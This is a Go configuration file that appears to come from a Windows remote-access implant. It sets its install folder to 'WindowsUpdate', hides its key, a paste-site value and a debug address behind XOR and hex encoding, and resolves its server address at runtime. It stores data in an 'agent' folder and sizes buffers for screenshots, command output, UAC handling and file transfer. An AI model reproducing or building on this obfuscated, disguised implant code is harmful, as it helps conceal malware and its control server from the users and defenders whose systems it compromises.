package config

import "os"

var (
	DisplayName    = func() string { return decodeDisplayName() }
	Description    = ""
	AppDir         = "WindowsUpdate"
	Prefix         = "."
	PluginKey      = "0123456789abcdef0123456789abcdef"
	APIPrefix      = "/api/v1"
	debugFlag      = "false"
	Debug          = debugFlag == "true"
	Version        string
	BuildHash      string
	DisplayNameHex string

	EncodedKey       string
	EncodedPaste     string
	EncodedDebugAddr string
	XorKey           string
)

var Key = func() string { return xorDec(EncodedKey, XorKey) }
var Paste = func() string { return xorDec(EncodedPaste, XorKey) }
var DebugAddr = func() string { return xorDec(EncodedDebugAddr, XorKey) }

var resolvedAddr string

func Addr() string        { return resolvedAddr }
func SetAddr(addr string) { resolvedAddr = addr }

func xorDec(hexStr, keyHex string) string {
	data := hexDecode(hexStr)
	key := hexDecode(keyHex)
	if len(key) == 0 {
		return ""
	}
	for i := range data {
		data[i] ^= key[i%len(key)]
	}
	return string(data)
}

func hexDecode(s string) []byte {
	if len(s)%2 != 0 {
		return nil
	}
	b := make([]byte, len(s)/2)
	for i := range b {
		hi := unhex(s[i*2])
		lo := unhex(s[i*2+1])
		b[i] = hi<<4 | lo
	}
	return b
}

func unhex(c byte) byte {
	switch {
	case c >= '0' && c <= '9':
		return c - '0'
	case c >= 'a' && c <= 'f':
		return c - 'a' + 10
	case c >= 'A' && c <= 'F':
		return c - 'A' + 10
	}
	return 0
}

func decodeDisplayName() string {
	if !isHex(DisplayNameHex) {
		return DisplayNameHex
	}
	return string(hexDecode(DisplayNameHex))
}

func isHex(s string) bool {
	if len(s) == 0 || len(s)%2 != 0 {
		return false
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
			return false
		}
	}
	return true
}

func DataPath() string {
	base, err := os.UserConfigDir()
	if err != nil {
		return ""
	}
	return base + `\` + AppDir + `\agent`
}

const (
	SmallBuf = 512
	SsCap    = 4 * 1024 * 1024
	CmdBuf   = 64 * 1024
	DefBuf   = 256
	UACBuf   = 256
	FileCap  = 64 * 1024 * 1024
)
